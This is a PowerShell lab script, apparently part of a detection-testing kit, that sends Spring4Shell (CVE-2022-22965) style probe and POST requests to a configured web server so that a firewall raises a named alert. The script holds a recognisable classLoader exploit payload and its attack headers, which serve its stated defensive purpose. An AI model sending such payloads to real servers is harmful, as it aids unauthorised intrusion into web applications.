<#
    Stage 2 - Spring4Shell exploit attempt  (EAL: web-attack)
    =========================================================
    The attacker sends the tell-tale Spring4Shell (CVE-2022-22965) payload that
    manipulates 'class.module.classLoader.*' to try to write a web shell. The
    request is benign here (no real RCE), but the firewall sees the pattern.

      EAL alert : 'Suspicious failed HTTP request - potential Spring4Shell exploit'
      ATT&CK    : Initial Access (TA0001) / Exploit Public-Facing Application (T1190)
      Severity  : Low   Source: PAN Firewall EAL Logs (or XDR agent)
#>
param([switch]$DryRun)
. "$PSScriptRoot\..\config\lab-config.ps1"
. "$PSScriptRoot\_traffic.ps1"
$cfg = $Global:EalDemo
if ($DryRun) { $cfg.DryRun = $true }

Write-Stage "STAGE 2: Spring4Shell payload against $($cfg.TargetWebServer)" "INFO"

$suffix = 'class.module.classLoader.resources.context.parent.pipeline.first.pattern'
$body   = "$suffix=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))&" +
          'class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp'
$hdr = @{ "suffix"=".jsp"; "c1"="Runtime"; "c2"="<%"; "Content-Type"="application/x-www-form-urlencoded" }

for ($i=1; $i -le [Math]::Min(3,$cfg.RequestsPerStep); $i++) {
    Invoke-BadHttp -BaseUrl $cfg.TargetWebServer -Path "/tomcatwar.jsp?$suffix=x" -Label "spring4shell-probe"
    Invoke-BadHttp -BaseUrl $cfg.TargetWebServer -Path "/" -Method "POST" -Headers $hdr -Body $body -Label "spring4shell-post"
}
Write-Stage "STAGE 2 (INITIAL ACCESS) done. Expect EAL: 'Suspicious failed HTTP request - potential Spring4Shell exploit' (rule 1028c23d)." "OK"
